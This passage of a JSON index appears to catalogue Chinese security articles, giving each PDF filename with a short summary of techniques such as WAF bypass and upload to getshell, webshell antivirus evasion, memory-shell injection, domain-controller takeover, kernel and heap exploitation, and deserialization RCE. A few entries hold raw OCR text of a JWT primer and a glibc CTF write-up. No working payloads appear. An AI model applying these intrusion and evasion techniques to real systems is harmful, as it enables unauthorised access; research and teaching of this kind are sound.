        "FileName": "9817-从外网代码审计到三层内网各种漏洞拿到域控.pdf"
    },
    {
        "page_content": "该文档详细介绍了渗透一个域靶场的过程，包括信息收集、漏洞利用、域内信息搜集、域控权限获取和导出域 hash 等步骤，最终目标是获得域控权限。",
        "FileName": "7646-记一次异常艰难的域靶场渗透.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者如何通过利用内网IP或IP白名单绕过WAF，并使用curl命令通过代理服务器上传PHP后缀文件，最终成功拿下站群。作者尝试了多种绕过WAF的方法，包括修改文件名、使用特殊字符和截断文件名，但都失败了。最后，作者利用了Windows系统中文件名末尾空格会被去掉的特性，并通过跨目录访问成功上传了PHP文件，绕过了WAF的限制。",
        "FileName": "7860-实战之另辟蹊径绕过waf并getshell拿下站群.pdf"
    },
    {
        "page_content": "该文档探讨了 Weblogic T3 协议中绕过白名单的方法，重点关注了 Externalizable 接口的实现和流转换技术，例如 WrapperDataInputStream 和 WLSObjectInputStream，以绕过 Weblogic 在 2021 年 4 月补丁中引入的白名单限制。",
        "FileName": "11087-Weblogic T3协议白名单绕过方法探索.pdf"
    },
    {
        "page_content": "本文介绍了多种绕过杀毒软件的 Webshell 免杀技巧，包括自定义加密、通过 HTTP 获取关键参数和重写函数。这些技巧利用了杀毒软件规则的局限性，通过绕过正则表达式和沙盒限制来实现免杀。",
        "FileName": "9290-一些webshell免杀的技巧.pdf"
    },
    {
        "page_content": "该文档分析了 XHcms 中存在的多个安全漏洞，包括文件包含、SQL 注入、XSS、垂直越权、CSRF 等，这些漏洞可能导致攻击者控制网站、窃取敏感信息或破坏网站功能。",
        "FileName": "11574-某cms代码审计.pdf"
    },
    {
        "page_content": "该文档探讨了利用 Kubernetes API Server 进行渗透测试的两种技术：通过 kcurl 命令直接与 API Server 通信，以及创建具有 API Server 功能的 Shadow API Server 以实现隐蔽和持久控制。",
        "FileName": "9031-K8s渗透测试之kube-apiserver利用.pdf"
    },
    {
        "page_content": "JSONP（JSON with padding）是一种跨域获取资源的技术，利用`<script>`标签不受同源策略限制的特性。JSONP劫持是指攻击者获取本应传给网站其他接口的数据，可能导致信息泄露、权限被盗用、挂马、钓鱼等安全问题。修复方法包括限制referer、使用token、严格过滤callback函数名和JSON数据输出等。",
        "FileName": "10051-JSONP与JSONP劫持漏洞的学习.pdf"
    },
    {
        "page_content": "该文档重点介绍了如何利用 HEVD 中的栈溢出漏洞，以在 Windows 7 x86-64 系统上获得内核权限。它详细介绍了漏洞利用的步骤，包括创建缓冲区、发送 IOCTL 请求、恢复程序执行和添加实际 shellcode。通过利用 RDI 寄存器与 RBX 寄存器的偏移量，该漏洞利用成功地恢复了程序执行，并最终获得了系统权限。",
        "FileName": "7914-HEVD内核漏洞 — Windows 7 x86-64 栈溢出.pdf"
    },
    {
        "page_content": "JWT(JSON Web Token) 是⼀种⽤于身份认证和授权的开放标准，它通过在⽹络应⽤间传递被加密的 JSON 数据来安全地传输信息 使得身份验证和授权变得更加简单和安全， JWT 对于渗透测试⼈员⽽⾔可能是⼀种⾮常吸引⼈的攻击途径，因为它们不仅是让 ⽤户获得⽆限访问权限的关键⽽且还被视为隐藏了通往以下特权的途径，例如 : 特权升级、信息泄露、 SQLi 、 XSS 、 SSRF 、 RCE 、 LFI 等 JWS ： Signed JWT ，签名过的 JWT JWK ： JWT 的密钥，也就是我们常说的 SECRET JWE ： Encrypted JWT 部分 payload 经过加密的 JWT JKU ： JKU(JSON Web Key Set URL) 是 JWT Header 中的⼀个字段，字段内容是⼀个 URI ，该 URI ⽤于指定⽤于验证令牌秘钥 的服务器，该服务器⽤于回复 JWK X5U ： X5U 是 JWT Header 中的⼀个字段，指向⼀组 X509 公共证书的 URL ，与 JKU 功能类似 X.509 标准： X.509 标准是密码学⾥公钥证书的格式标准，包括 TLS/SSL(WWW 万维⽹安全浏览的基⽯ ) 在内的众多 Internet 协议 都应⽤了 X.509 证书） JWT(JSON Web Token) 的结构由三部分组成，分别是 Header 、 Payload 和 Signature ，下⾯是每⼀部分的详细介绍和示例： Header 包含了 JWT 使⽤的算法和类型等元数据信息，通常使⽤ JSON 对象表示并使⽤ Base64 编码， Header 中包含两个字段： alg(algorithm) ：指定了使⽤的加密算法，常⻅的有 HMAC 、 RSA 和 ECDSA 等算法 typ(type) ：指定了 JWT 的类型，通常为 JWT 下⾯是⼀个示例 Header ： { \t\t\"alg\":\t\"HS256\", \t\t\"typ\":\t\"JWT\" } 其中 alg 指定了使⽤ HMAC-SHA256 算法进⾏签名， typ 指定了 JWT 的类型为 JWT Payload 包含了 JWT 的主要信息，通常使⽤ JSON 对象表示并使⽤ Base64 编码， Payload 中包含三个类型的字段：注册声明 (Registered Claims) ：是⾃定义的字段，⽤于传递⾮敏感信息，例如 : ⽤户 ID 、⻆⾊等 私有声明 (Private Claims) ：是⾃定义的字段，⽤于传递敏感信息，例如密码、信⽤卡号等 ⽂章前⾔ 简单介绍 基础概念 基本结构 Header Payload注册声明 (Registered Claims) ：预定义的标准字段，包含了⼀些 JWT 的元数据信息，例如 : 发⾏者、过期时间等 下⾯是⼀个示例 Payload ： { \t\t\"sub\":\t\"1234567890\", \t\t\"name\":\t\"John\tDoe\", \t\t\"iat\":\t1516239022 } 其中 sub 表示主题， name 表示名称， iat 表示 JWT 的签发时间 Signature 是使⽤指定算法对 Header 和 Payload 进⾏签名⽣成的，⽤于验证 JWT 的完整性和真实性， Signature 的⽣成⽅式通常是将 Header 和 Payload 连接起来然后使⽤指定算法对其进⾏签名，最终将签名结果与 Header 和 Payload ⼀起组成 JWT ， Signature 的⽣成 和验证需要使⽤相同的密钥，下⾯是⼀个示例 Signature HMACSHA256(base64UrlEncode(header)\t+\t\".\"\t+base64UrlEncode(payload),secret) 其中 HMACSHA256 是使⽤ HMAC SHA256 算法进⾏签名， header 和 payload\n```",
        "FileName": "12906-JWT渗透姿势一篇通.pdf"
    },
    {
        "page_content": "本文档探讨了 Spring MVC 框架的安全浅析，包括其实现逻辑、Model 向 View 传递值、获取 URL 参数值、Spel 简介、Spel 注入漏洞分析以及 Spring Data Commons RCE 漏洞的详细介绍。",
        "FileName": "10590-Spring MVC框架安全浅析.pdf"
    },
    {
        "page_content": "该文档分析了 OurPHPCMS 中的几个安全漏洞，包括 XSS、SQL 注入和后台写文件 getshell。它详细描述了如何利用这些漏洞，并提供了修复建议。",
        "FileName": "12566-OurPHPCMS审计浅析.pdf"
    },
    {
        "page_content": "本文分析了 Spring Web 框架处理请求的过程，重点关注了 DispatcherServlet 的作用和请求 URL 的解析机制。DispatcherServlet 负责接收 HTTP 请求并根据请求信息分发到相应的控制器进行处理。请求 URL 的解析涉及多个步骤，包括获取请求 URI、移除分号和解码 URL，这些步骤中存在一些潜在的漏洞，可能导致未授权访问。",
        "FileName": "12661-探究SpringWeb对于请求的处理过程.pdf"
    },
    {
        "page_content": "Java 反序列化漏洞利用链分析，通过 Java 反序列化利用点（readObject 反序列化利用点）和利利用链（URLDNS 利利用链）来确认 readObject 反序列化利用点的存在，并通过 DNS 查询来验证是否存在反序列化漏洞。",
        "FileName": "9417-Java反序列化 — URLDNS利用链分析.pdf"
    },
    {
        "page_content": "WordPress Page Builder 插件存在一个 CSRF to XSS 漏洞，该漏洞允许攻击者通过诱使管理员单击特制链接来创建新管理员帐户并安装后门程序。该漏洞源于实时编辑器中缺少 CSRF 令牌验证，导致攻击者可以提交修改后的页面数据，其中包含 XSS 有效负载，从而触发 XSS 漏洞。",
        "FileName": "7810-WordPress Page Buider插件 CSRF to XSS漏洞分析.pdf"
    },
    {
        "page_content": "本文深入分析了 Go 逆向的语法特性和数据结构，包括数值类型、字符串、数组、切片、字典、结构体、接口、新建对象、函数和方法、栈空间、变参、匿名函数、函数反射、伸缩栈、调用约定、写屏障、协程、延迟执行、调用 C 库等方面，为 Go 逆向分析提供了全面的指导。",
        "FileName": "9015-【技术推荐】正向角度看Go逆向.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-35218 漏洞，该漏洞是 SolarWinds Patch Manager Chart 端点中的远程代码执行漏洞。通过比较补丁前后的 DLL 文件，作者确定漏洞位于 SolarWinds.PM.Web.dll 中的 SolarWinds.PM.Web.Charting.ScmChartImageHandler 类中，并构造了一个利用该漏洞的 PoC。",
        "FileName": "10443-CVE-2021–35218 SolarWinds Patch Manager Chart端点RCE.pdf"
    },
    {
        "page_content": "**文档主题：** Burp 插件开发（一）\n\n**文档内容：**\n\nBurp 是一个用于渗透测试的商业软件，它提供了许多功能，包括代理、扫描器、重复器和序列发生器。Burp 插件是使用 Jython 语言编写的，可以扩展 Burp 的功能。\n\n本文档介绍了如何使用 IBurpExtenderCallbacks 接口来开发 Burp 插件。该接口提供了许多方法，允许插件与 Burp 交互，例如注册菜单项、处理 HTTP 消息和访问 Burp 的 API。\n\n**示例代码：**\n\n```python\nfrom burp import IBurpExtender, IBurpCollaboratorClientContext\n\nclass BurpExtender(IBurpExtender, IBurpCollaboratorClientContext):\n    def registerExtenderCallbacks(self, callbacks):\n        self._callbacks = callbacks\n        self._helpers = callbacks.getHelpers()\n        callbacks.setExtensionName('IBurp')\n        collaboratorContext = callbacks.createBurpCollaboratorClientContext()\n        print(collaboratorContext.generatePayload(True))\n        print(collaboratorContext.generatePayload(True))\n```\n\n**输出：**\n\n```\nhttp://{collaboratorPayload}/\nhttp://{collaboratorPayload}/\n```\n\n**解释：**\n\n此示例代码演示了如何使用 IBurpCollaboratorClientContext 接口来生成 DNS 负载。该负载可用于测试盲 XXE 和盲 SSRF 漏洞。",
        "FileName": "7065-打造高度自定义的渗透工具-Burp插件开发（一）.pdf"
    },
    {
        "page_content": "Joern 是一款 C/C++ 源码扫描工具，与 Fortify 和 codeql 相比，Joern 无需编译源码即可进行扫描，在适用场景和环境搭建方面更加简单。Joern 提供了多种解析代码的方式，包括 importCode 和 joern-parse，并通过 cpg 对象表示目标源码中的所有信息，方便用户遍历和检索代码中的函数调用、类型定义等。Joern 的规则脚本开发语言是 Scala，其在代码分析阶段会将代码转换成抽象语法树、控制流图、数据流图等结构，然后在规则解析阶段将这些图的属性和节点封装成 Java 对象，供用户开发的 Scala 规则脚本访问和查询。",
        "FileName": "9277-CC++源码扫描系列- Joern 篇.pdf"
    },
    {
        "page_content": "该文档分析了 Metasploit 和 CobaltStrike 中 shellcode 的生成和执行过程，重点关注了 Reverse Tcp、Reverse Http 和 Reverse Dns 的实现细节。它通过分析汇编代码和 API 调用，揭示了这些 shellcode 如何建立连接、接收数据并执行恶意代码。",
        "FileName": "7996-Metasploit  & CobaltStrike  的shellcode分析.pdf"
    },
    {
        "page_content": "**主题：** Wildfly 中间件 Filter 内存马分析\n\n**内容：** 本文分析了 Wildfly 中间件 Filter 内存马，详细介绍了如何通过获取部署信息、实例化 FilterInfo 对象并将其添加到部署信息中，以及插入 Filter URL 映射来注入恶意 Filter。还提供了编写内存马的 Java 代码示例，该代码利用了 XSLT 转换器来加载和注入恶意 Filter。",
        "FileName": "12161-Wildfly中间件内存马分析.pdf"
    },
    {
        "page_content": "该文档分析了 Jackson JDOM XSLTransformer Gadget 漏洞，该漏洞允许攻击者通过发送恶意的 JSON 消息来读取远程服务器上的任意文件。该漏洞是由于 Jackson 2.x ~2.9.9 在启用 enableDefaultTyping 时使用 JDOM 1.x 或 JDOM 2.x 依赖项造成的。攻击者利用 XXE 攻击，通过构造恶意 XML 代码，远程加载外部 DTD 文件，并发送要读取的文件内容到攻击者的 FTP 服务器。该漏洞已在较新的 Jackson 版本中修复，建议升级 Jackson-databind 到最新版本并关闭 enableDefaultTyping。",
        "FileName": "7820-Jackson JDOM XSLTransformer Gadget浅析.pdf"
    },
    {
        "page_content": "Kerberos 协议是一种网络认证协议，用于为客户端/服务器应用程序提供强有力的认证服务。该协议涉及三个主要参与者：客户端、服务器和密钥分发中心 (KDC)。KDC 负责验证客户端身份并颁发票据，而客户端使用这些票据从服务器获取服务。Kerberos 认证过程包括两个基本模块：AS_REQ&AS_REP 和 TGS_REQ&TGS_REP，以及可能使用的 S4U 和 PAC 模块。通过分析 AS-REQ、AS-REP、TGS-REQ 和 TGS-REP 数据包，可以深入了解 Kerberos 认证过程，并识别潜在的攻击媒介。",
        "FileName": "8187-内网渗透之kerberos协议分析.pdf"
    },
    {
        "page_content": "该文档分析了 xxl-job API 中未授权的 Hessian2 反序列化漏洞，该漏洞允许攻击者在未经身份验证的情况下执行任意代码。该漏洞存在于 xxl-job 2.0.2 及更低版本中，利用该漏洞，攻击者可以绕过 JNDI 注入限制，通过在 CLASSPATH 中添加危险方法或属性来执行任意代码。",
        "FileName": "8456-xxl-job api未授权Hessian2反序列化.pdf"
    },
    {
        "page_content": "这篇文档探讨了 ASP.NET 中一个鲜为人知的遗留特性，该特性允许攻击者通过修改 URL 路径向任意端点添加任意内容，从而导致 XSS 攻击。该特性源于 ASP.NET 中使用波浪号 (~) 将相对应用程序根目录的 URL 解析为特定路径的功能，即使应用程序部署到子目录或更改部署位置，该路径也会随之更改。攻击者可以利用此特性来控制脚本 URI 路径，从而执行 XSS 攻击。",
        "FileName": "7453-通杀.NET的XSS!.pdf"
    },
    {
        "page_content": "该文档详细介绍了 DedeCMS V6.0.3 代码审计中发现的多个漏洞，包括文件上传、后台 RCE、SQL 注入和文件写入漏洞，并提供了利用这些漏洞的 PoC 和详细的解释。",
        "FileName": "10486-DedeCMSV6.0.3 代码审计.pdf"
    },
    {
        "page_content": "该文档记录了一次授权渗透测试，其中测试人员通过弱口令和公司域名作为密码的方法登录了多个系统，并通过修改头像上传 webshell 获得了对服务器的控制权。测试人员还发现了包含数据库连接信息的文档，并通过解密脚本获得了密码，从而访问了大量学生和教师数据。",
        "FileName": "9487-记一次授权渗透测试.pdf"
    },
    {
        "page_content": "本文档介绍了如何通过分析 V8 源代码中的补丁来解决 Chromium RCE 竞赛中的一个漏洞。该漏洞涉及对 Attached 状态检查的删除，导致释放的块可读写。通过利用 tcache 攻击劫持 __free_hook，攻击者可以泄露 libc 地址并触发 system('/bin/sh')。",
        "FileName": "8057-透过tcft2020的chromium_rce学习V8.pdf"
    },
    {
        "page_content": "本文分析了一道代码审计题，该题要求构造一个不包含数字或字母的 Webshell。文章详细解释了题目的代码逻辑，并提供了两种绕过限制字符的有效方法：自增和异或。文章还提供了两种利用方法的详细步骤和示例 payload，并总结了所涉及的知识点和收获。",
        "FileName": "7181-通过一道代码审计题目来练习无数字字母构造webshell.pdf"
    },
    {
        "page_content": "本文档探讨了 PHP 模板注入的各种技术，包括 Smarty 和 Twig 模板引擎的低版本和高版本利用方法。它介绍了利用 X-Forwarded-For 头、{php} 标签、{literal} 标签、Smarty 类的 getStreamVariable 方法、Smarty_Security 沙盒保护机制、Twig 过滤器等技术来实现命令执行和文件包含。文档还提供了 POC 和绕过策略，并强调了在实战场景中可能遇到的开发者修改和安全策略。",
        "FileName": "11228-php高版本模版注入tricks.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何绕过深信服 WAF 进行任意文件上传，包括后缀名绕过、内容绕过、获取网站根目录和使用 base64 五层编码写入 shell 的步骤。",
        "FileName": "11337-记一次绕过waf的任意文件上传.pdf"
    },
    {
        "page_content": "该文档探讨了在 Go 语言中实现插件化的不同方法，重点关注使用 Yaegi 解释器在编译型语言中实现脚本语言功能。它介绍了 Go 中插件化的概念，并讨论了使用 Yaegi 解释器在 Go 中实现插件化的可行性。文档还提供了使用 Yaegi 解释器实现插件化的分步指南，包括如何生成第三方库的符号表、如何使用 Yaegi 执行 Go 脚本以及如何解决反射调用结构体方法的问题。",
        "FileName": "11318-go下的插件化实现.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何解决 Intigriti 2020 年 5 月 XSS 挑战，该挑战涉及利用路径覆盖、开放重定向和路径遍历来加载恶意 JavaScript 文件，从而在 Firefox 浏览器中执行 XSS 攻击。",
        "FileName": "7800-Intigriti的2020年5月XSS挑战.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 DWR 框架中的文件上传漏洞进行渗透测试。它详细描述了漏洞的原理、如何通过 DWR.xml 查看映射关系、如何配置 DWR 和 web.xml 文件、如何创建 JSP 页面进行文件上传，以及如何使用 Burp 抓取数据包并构造请求进行 SQL 注入。",
        "FileName": "8431-实战渗透-基于DWR框架下的漏洞探测.pdf"
    },
    {
        "page_content": "文档主题是 Active Directory 中的 AdminSDHolder 对象，它为受保护的域用户和组提供权限模板。文档内容介绍了 AdminSDHolder 的目的、属性、权限设置和修改过程，以及攻击者如何利用 AdminSDHolder 留后门。它还提供了防御和检测措施，例如监控对 AdminSDHolder ACL 的修改。",
        "FileName": "10436-AdminSDHolder.pdf"
    },
    {
        "page_content": "该文档探讨了 SAML 和 OIDC 身份验证标准中 XML 签名和转换的潜在安全风险。它重点介绍了 Apache Santuario xmlsec 库中的漏洞，这些漏洞允许通过 XSLT 转换执行远程代码执行 (RCE)。文档还讨论了绕过安全验证属性和利用 XML 加密中的转换来实现 RCE 的方法。",
        "FileName": "12584-CVE-2022-47966 SAML RCE.pdf"
    },
    {
        "page_content": "本文探讨了 Node.js 中沙箱环境的安全性，重点关注 vm 和 vm2 模块。它强调了 vm 的局限性，并介绍了 vm2 作为一种更安全的替代方案。此外，本文还讨论了 JavaScript 中的原型链污染和全局变量污染，并提供了缓解这些问题的技术。",
        "FileName": "7842-nodejs沙箱与黑魔法.pdf"
    },
    {
        "page_content": "该文档详细介绍了对某 OA 系统 Java 代码的审计过程，包括前台任意文件读取和后台 getshell 漏洞的利用。通过分析代码，审计人员发现可以读取 MySQL 数据库文件，获取管理员密码，并利用网盘功能上传 shell，最终实现对系统的控制。",
        "FileName": "9225-某oa java代码审计1.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-29582 Linux 内核漏洞，该漏洞影响 io_uring 子系统，允许攻击者在内核中执行条件竞争漏洞，从而导致本地提权。该漏洞主要涉及 io_uring 中 IORING_OP_TIMEOUT 和 IORING_OP_LINK_TIMEOUT 操作的竞争条件，攻击者可以通过将这两个操作链接在一起，触发条件竞争漏洞。通过利用该漏洞，攻击者可以释放悬空引用，并通过对象替换技术重新分配另一个对象到悬空引用地址，从而引发 Use-After-Free。为了利用该漏洞，攻击者需要绕过堆隔离，通过释放文件对象来绕过 slab 缓存边界，并通过重新分配 msg_msgseg 对象来覆盖 tls_context 对象。最后，攻击者可以通过触发栈迁移来执行 ROP 链，从而获得 root 权限。",
        "FileName": "12633-Linux kernel exploitCVE-2022-29582.pdf"
    },
    {
        "page_content": "该文档介绍了利用 Fastjson、JNDI 和 Tomcat 的漏洞进行攻击。攻击者可以通过构造恶意 JSON 数据，利用 Fastjson 的反序列化功能，在目标系统上执行任意代码。该漏洞可以分为两种利用方式：出网利用和不出网利用。出网利用需要目标系统可以访问外部网络，而不出网利用则不需要。文档详细分析了漏洞的触发点、利用方式和影响范围，并提供了利用代码示例。",
        "FileName": "12513-fastjson结合JNDI和Tomcat.pdf"
    },
    {
        "page_content": "LLVM PASS PWN 是一种 LLVM 系统中重要的组成部分，负责 LLVM 编译器的大部分工作。它通过一系列 Pass 的组合构建了编译器的转换和优化部分，将源代码翻译成汇编语言或机器码。LLVM PASS PWN 的用途包括插桩、机器无关的代码优化、静态分析和代码混淆。",
        "FileName": "11762-LLVM PASS PWN（一）.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 的 PHP 代码，发现了一个前台 SQL 注入漏洞，可用于获取管理员账号密码。虽然无法直接获取后台地址，但通过定位危险函数，作者找到了一个后台 GetShell 漏洞，利用文件覆盖技术修改根目录下的 .htaccess 文件，从而实现 PHP 解析。此外，文档还提到了一个二次任意文件删除漏洞，可通过构造需要删除的文件路径存入数据库，再触发其他点进行删除。",
        "FileName": "11265-PHP代码审计-某CMS漏洞合集.pdf"
    },
    {
        "page_content": "本文介绍了 XSS 攻击的思路和方法，包括盲打 XSS、使用 SET 钓取管理员密码和使用 Flash 钓取管理员密码等，并提供了相关工具和示例代码。",
        "FileName": "8459-XSS 实战攻击思路总结.pdf"
    },
    {
        "page_content": "该文档分析了 Joomla CMS 中的一个提权漏洞 (CVE-2020-11890)，该漏洞允许攻击者将 Administrator 用户组提升为 Super Users 组，从而获得 Joomla 的所有权限。漏洞的利用过程涉及修改用户组表中的数据，导致程序在检查权限时出现错误，从而绕过权限检查。",
        "FileName": "7709-Joomla提权漏洞（CVE-2020-11890）.pdf"
    },
    {
        "page_content": "本文介绍了一种应对参数编码混淆越权尝试的方法。当遇到混淆编码时，不要放弃，可以尝试对编码进行解码，并通过逐步去掉字符进行尝试，最终获得正确的参数值。通过修改参数值并进行 base64 加密，可以成功触发越权操作。",
        "FileName": "7779-一次对参数编码混淆越权的尝试.pdf"
    },
    {
        "page_content": "该文档分析了 Tomcat 内存马的主题和内容，包括 filter、servlet、listener、valve 等类型的内存马，以及如何创建和配置它们以在 Tomcat 服务器上实现远程代码执行。",
        "FileName": "11988-Tomcat内存马——FilterservletListenervalve.pdf"
    },
    {
        "page_content": "Apache Unomi 1.5.1 版本中存在两个远程代码执行（RCE）漏洞（CVE-2020-13942），它们绕过了之前的补丁（修复 CVE-2020-11975），允许攻击者通过 MVEL 或 OGNL 表达式执行任意代码，从而获得 Unomi 应用程序的权限。",
        "FileName": "8565-漏洞分析 - Apache Unomi RCE 第2篇 OGNLMVEL注入(CVE-2020-13942).pdf"
    },
    {
        "page_content": "该文档主要介绍了如何分析 Java 内存马分析集合，包括如何使用 Servlet、Listener、Filter、Spring Controller 和 Interceptor 来注入内存马。",
        "FileName": "11084-java内存马分析集合.pdf"
    },
    {
        "page_content": "该文档分析了 phpmyadmin 4.8.2 中的一个 XSS 漏洞，该漏洞允许攻击者通过修改 $GLOBALS 全局变量中的键值来注入恶意代码。攻击者可以通过向 mysql.user 表中添加一个名为 text_dir 的列，并将其值设置为 XSS 有效负载，来利用此漏洞。在 phpmyadmin 4.8.3 中，此漏洞已通过将 $_REQUEST 替换为 $_POST 并验证 POST 请求的令牌来修复。",
        "FileName": "7797-phpmyadmin4.8.3 XSS挖掘.pdf"
    },
    {
        "page_content": "本文档详细介绍了域渗透中绕过安全组件的方法，包括使用Impacket组件、PotitPetam攻击、NTLM降级和DCSync，最终成功获取域管理员和域用户凭证，绕过了微软ATP、Fortinet和CrowdStrike的Falcon安全组件。",
        "FileName": "11096-域渗透之完全绕开安全组件.pdf"
    },
    {
        "page_content": "CVE-2020-15257 漏洞分析主要针对 Docker 容器在 --net=host 模式下启动时暴露的 containerd-shim 监听的 Unix 域套接字，攻击者可以通过操作 containerd-shim API 逃逸。利用过程包括获取 Docker 存储路径和 Docker ID，然后利用 shim 的 Create API 调用 Docker 根目录下的 nc 程序，反弹 shell，得到 host 的 root 权限，完成虚拟机逃逸。",
        "FileName": "8925-CVE-2020-15257-host模式容器逃逸漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 RMI 工作原理，重点关注服务端和客户端之间的通信协议和数据包交换。它深入探讨了注册端和服务端的内部工作机制，包括对象绑定、方法调用和垃圾回收。文档还解释了 DGC（分布式垃圾回收）协议，该协议用于管理远程对象的生存期。",
        "FileName": "8644-深入学习rmi工作原理.pdf"
    },
    {
        "page_content": "该文档记录了一次 CMS 渗透测试，详细介绍了信息收集、漏洞利用、提权和后门留存等步骤。通过 Nmap、AWVS 扫描器和 SQLmap 等工具，渗透测试人员发现了 SQL 注入漏洞，并利用该漏洞获取了数据库信息和用户凭据。随后，他们利用文件上传漏洞上传了恶意文件，并通过反弹 shell 获取了服务器的交互式终端。最后，渗透测试人员通过创建新用户并切换到 root 用户，获得了对服务器的完全控制。",
        "FileName": "9836-记一次cms渗透测试.pdf"
    },
    {
        "page_content": "该文档介绍了 Fastbin Attack，一种基于 fastbin 机制的漏洞利用方法，该方法利用堆溢出和 use-after-free 等漏洞来控制 chunk 内容，从而实现任意内存分配、类型混淆等攻击。",
        "FileName": "12279-Fastbin Attack.pdf"
    },
    {
        "page_content": "该文档分析了 DVWA 靶场中的不安全验证码漏洞，该漏洞允许攻击者通过构造请求绕过验证码验证，从而更改密码。文档详细介绍了漏洞的利用方法，并提供了不同安全级别的代码分析，展示了如何修复该漏洞。",
        "FileName": "12036-DVWA靶场之Insecure CAPTCHA学习分享.pdf"
    },
    {
        "page_content": "该文档分析了如下文档：\n\n```\n1.登录 从 fclose 到任意代码执⾏ - 记 glibc 2.29 下的⼀次⽂件攻击 从 fclose 到任意代码执⾏ - 记 glibc 2.29 下的⼀次⽂件攻击 ama2in9   /  2020-02-17 09:25:05  /  浏览数  36257 前⼏天打了 \t HackTM\tCTF \t ，遇到了这样⼀道在 \t glibc\t2.29 \t 下的⽂件利⽤的新型题⽬，虽然是⽤了更新的 glibc ，但是 \t glibc2.29 \t 的⼀个新特性使得解决⽅法⽐低版本的 glibc ⽂件利⽤更简单了⼀些，这⾥同⼤家分享⼀下。 ⽂件为 64 位程序，保护全开，逻辑很简单，开头的 \t gift \t 输出了 \t system \t 函数的 libc 地址，在给定 libc 的条件下我们可以根据其在 libc 中的偏移计算得到 libc 基地址。之后有两次地址任意写的机会，最后关闭了 \t stdout \t 、 \t stdin \t 以及 \t stderr \t 。 在程序的开头有⼀个 \t nohack \t 函数，可以看到出题⼈调⽤ \t mprotect \t 把从 \t &stdout[10]._IO_write_end \t 开始的 0x700 字节设置 为了只读，避免我们修改其中的值，这块区域我们动态调试看下，发现其内容是很多形如 \t _IO*_jumps \t 的 \t vtable \t ，也就是让这 些 \t vtable \t 只读不可写。 int \t nohack () { \t\t if \t ( \t (( _WORD ) stdout \t + \t 0x8A0 ) \t & \t 0xFFF \t ) \t\t { \t\t\t\t puts ( \"mprotect\terror\" ); \t\t\t\t exit ( 1 ); \t\t } \t\t return \t mprotect ( & stdout [ 10 ]. _IO_write_end , \t 0x700uLL , \t 1 ); //\t 可读 } gdb-peda$\tp\t & \t_IO_2_1_stdout_ $6 \t = \t ( struct\t_IO_FILE_plus\t* ) \t0x7ffff7f6c760\t<_IO_2_1_stdout_> gdb-peda$\tx/8gx\t0x7ffff7f6c760+0x8a0\n2.//\t 可读 } gdb-peda$\tp\t & \t_IO_2_1_stdout_ $6 \t = \t ( struct\t_IO_FILE_plus\t* ) \t0x7ffff7f6c760\t<_IO_2_1_stdout_> gdb-peda$\tx/8gx\t0x7ffff7f6c760+0x8a0 0x7ffff7f6d000\t<_IO_wfile_jumps_mmap+160>:\t\t\t\t\t\t0x00007ffff7e19940\t\t\t\t\t\t0x0000000000000000 0x7ffff7f6d010:\t0x0000000000000000\t\t\t\t\t\t0x0000000000000000 0x7ffff7f6d020\t<_IO_wfile_jumps>:\t\t\t\t\t\t\t0x0000000000000000\t\t\t\t\t\t0x0000000000000000 0x7ffff7f6d030\t<_IO_wfile_jumps+16>:\t\t\t\t0x00007ffff7e15ff0\t\t\t\t\t\t0x00007ffff7e10140 gdb-peda$\tvmmap\t0x7ffff7f6d000 Start\t\t\t\t\t\t\t\t\t\t\t\t\t\tEnd\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tPerm\t\t\t\t\t\tName 0x00007ffff7f6d000\t0x00007ffff7f6e000\tr--p\t\t\t\t\t\t/usr/lib/x86_64-linux-gnu/libc-2.29.so 此外程序开了沙箱，其规则如下，给 \t open/read/write/mmap/mprotect/brk/rt_sigreturn/exitexit_group \t 这些系统调⽤开了 ⽩名单，其余⼀律禁掉。 前⾔ HackTM CTF 2020->trip_to_trick 程序分析wz@wz-virtual-machine:~/Desktop/CTF/BitsCTF/trip_to_trick1$\tseccomp-tools\tdump\t./trip_to_trick\t \tline\t\tCODE\t\tJT\t\t\tJF\t\t\t\t\t\t K ================================= \t 0000 :\t0x20\t0x00\t0x00\t0x00000004\t\t A \t = \tarch \t 0001 :\t0x15\t0x00\t0x0e\t0xc000003e\t\t if \t ( A\t! = \tARCH_X86_64 ) \tgoto\t 0016 \t 0002 :\t0x20\t0x00\t0x00\t0x00000000\t\t A \t = \tsys_number \t 0003 :\t0x35\t0x00\t0x01\t0x40000000\t\t if \t ( A\t<\t0x40000000 ) \tgoto\t 0005 \t 0004 :\t0x15\t0x00\t0x0b\t0xffffffff\t\t if \t ( A\t! = \t0xffffffff ) \tgoto\t 0016 \t 0005 :\t0x15\t0x09\t0x00\t0x00000000\t\t if \t ( A \t == \t read ) \tgoto\t 0015 \t 0006 :\t0x15\t0x08\t0x00\t0x00000001\t\t if \t ( A \t == \twrite ) \tgoto\t 0015 \t 0007 :\t0x15\t0x07\t0x00\t0x00000002\t\t if \t ( A \t == \topen ) \tgoto\t 0015 \t 0008 :\t0x15\t0x06\t0x00\t0x00000003\t\t if \t ( A \t == \tclose ) \tgoto\t 0015 \t 0009 :\t0x15\t0x05\t0x00\t0x00000009\t\t if \t ( A \t == \tmmap ) \tgoto\t 0015 \t 0010 :\t0x15\t0x04\t0x00\t0x0000000a\t\t if \t ( A \t == \tmprotect ) \tgoto\t 0015 \t 0011 :\t0x15\t0x03\t0x00\t0x0000000c\t\t if \t ( A \t == \tbrk ) \tgoto\t 0015 \t 0012 :\t0x15\t0x02\t0x00\t0x0000000f\t\t if \t ( A \t == \trt_sigreturn ) \tgoto\t 0015 \t 0013 :\t0x15\t0x01\t0x00\t0x0000003c\t\t if \t ( A \t == \t exit ) \tgoto\t 0015 \t 0014 :\t0x15\t0x00\t0x01\t0x000000e7\t\t if \t ( A\t! = \texit_group ) \tgoto\t 0016 \t 0015 :\t0x06\t0x00\t0x00\t0x7fff0000\t\t return \tALLOW \t 0016 :\t0x06\t0x00\t0x00\t0x00000000\t\t return \tKILL int \t __",
        "FileName": "7205-从fclose到任意代码执行-记glibc 2.29下的一次文件攻击.pdf"
    },
    {
